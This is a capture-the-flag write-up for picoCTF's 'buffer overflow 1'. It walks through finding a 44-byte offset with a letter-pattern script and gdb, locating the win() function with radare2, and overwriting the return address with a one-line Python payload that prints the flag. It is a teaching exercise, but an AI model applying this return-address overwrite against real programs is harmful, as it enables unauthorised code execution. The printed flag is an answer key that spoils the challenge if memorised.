#buffer overflow 1
That last one was pretty easy it looks like we have to control the return address this time.
Let's see if there is anything to make our lives easier in the source.

```
#define BUFSIZE 32

void win() {                                                                                                                                                                                                     
  char buf[FLAGSIZE];                                                                                                                                                                                            
  FILE *f = fopen("flag.txt","r");                                                                                                                                                                               
  if (f == NULL) {                                                                                                                                                                                               
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");                                                                            
    exit(0);                                                                                                                                                                                                     
  }
```
Looks like we have to jump to the win function with a buffer size of 32
Let's write a quick python script to do some debugging:
```
import sys

for i in range(26):
 sys.stdout.write(chr(i+0x41)*4)
```
This will print 4 of each letter of the alphabet to make our lives alittle easier when debugging with gdb let's first write it to a file
```
python flooder.py > out
```
after running it through gdb we find that eip is flooded with 0x4c4c4c4c (LLLL) so let's use some math to find the distance
```
echo $((0x4c-0x41))
11
```
11*4 = 44 so our buffer is 44 now we just need to find the location of win so we can call it.
Let's check it out in radare2
```
[0x080484d0]> ? sym.win
134514123 0x80485cb 01001102713 128.3M 804000:05cb 134514123 "\xcb\x85\x04\b" 0b00001000000001001000010111001011 134514123.0 134514128.000000f 134514123.000000 0t100101010000200120
```
Sweet it's located at 0x80485cb time to write our exploit!

```
$ python -c 'print("X"*44+"\xcb\x85\x04\x08")' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
picoCTF{addr3ss3s_ar3_3asy56a7b196}Segmentation fault (core dumped)
```

Killing it!
